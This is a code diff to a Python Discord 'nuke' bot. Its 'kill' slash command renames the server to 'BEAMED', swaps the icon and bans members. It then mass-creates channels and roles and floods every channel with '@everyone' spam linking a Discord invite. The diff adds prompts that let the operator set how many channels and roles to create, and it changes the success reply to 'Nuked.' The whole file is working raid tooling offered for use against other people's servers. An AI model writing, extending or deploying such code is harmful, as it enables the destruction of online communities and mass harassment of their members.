@@ -1,3 +1,5 @@
+# MADE BY ZENTONIK
+
 import discord
 from discord.ext import commands
 import aiohttp
@@ -11,6 +13,18 @@ intents.guild_messages = True
 intents.members = True
 
 bot = commands.Bot(command_prefix="!", intents=intents)
+def get_user_input():
+    try:
+        num_channels = int(input("Enter the number of channels to create: "))
+        num_roles = int(input("Enter the number of roles to create: "))
+        channel_name = input("Enter the base name for the channels: ")
+        role_name = input("Enter the name for the roles: ")
+        return num_channels, num_roles, channel_name, role_name
+    except ValueError:
+        print("Invalid input. Please enter integer values.")
+        return get_user_input()
+
+num_channels, num_roles, channel_name, role_name = get_user_input()
 
 @bot.event
 async def on_ready():
@@ -56,10 +70,10 @@ async def kill(interaction: discord.Interaction):
     print(f"Kill command received from {interaction.user} in guild {guild.name} ({guild.id})")
 
     try:
-        await handle_rate_limit(guild.edit, name="BEAMED") # Server Name
+        await handle_rate_limit(guild.edit, name="BEAMED")  # Server Name
         print("Server name changed to BEAMED")
 
-        icon_url = "SERVER_ICON_URL" # Server Icon URL
+        icon_url = "SERVER_ICON"  # Replace with your server icon URL
         async with aiohttp.ClientSession() as session:
             async with session.get(icon_url) as response:
                 icon_bytes = await response.read()
@@ -88,30 +102,31 @@ async def kill(interaction: discord.Interaction):
             except discord.HTTPException as e:
                 print(f"Failed to ban user {member.name} ({member.id}): {e}")
 
-        base_name = "BEAMED" # channel name
         new_channels = []
-        for _ in range(30): # number of new channels
+        for i in range(num_channels):
             try:
-                channel = await handle_rate_limit(guild.create_text_channel, base_name)
+                channel_name_with_number = f"{channel_name}_{i + 1}"
+                channel = await handle_rate_limit(guild.create_text_channel, channel_name_with_number)
                 new_channels.append(channel)
-                print(f"Created new channel '{base_name}'")
+                print(f"Created new channel '{channel_name_with_number}'")
             except discord.HTTPException as e:
-                print(f"Failed to create channel '{base_name}': {e}")
+                print(f"Failed to create channel '{channel_name_with_number}': {e}")
 
         new_roles = []
-        for _ in range(30):
+        for i in range(num_roles):
             try:
-                role = await handle_rate_limit(guild.create_role, name="BEAMED") # Role Name
+                role_name_with_number = f"{role_name}_{i + 1}"
+                role = await handle_rate_limit(guild.create_role, name=role_name_with_number)
                 new_roles.append(role)
-                print(f"Created new role")
+                print(f"Created new role '{role_name_with_number}'")
             except discord.HTTPException as e:
-                print(f"Failed to create role: {e}")
+                print(f"Failed to create role '{role_name_with_number}': {e}")
 
         all_channels = list(guild.channels) + new_channels
         
-        await send_messages_concurrently(all_channels, "@everyone BEAMED BY https://discord.gg/Q56VMd6YYR", 100) # Message sent to all channels
+        await send_messages_concurrently(all_channels, "@everyone BEAMED BY https://discord.gg/Q56VMd6YYR", 100)
 
-        await interaction.followup.send("All channels, roles, and users have been deleted and banned. The server name and icon have been changed, and 10 new channels and roles have been created with messages sent.")
+        await interaction.followup.send("Nuked.")
 
     except discord.HTTPException as e:
         print(f"Failed to execute command: {e}")
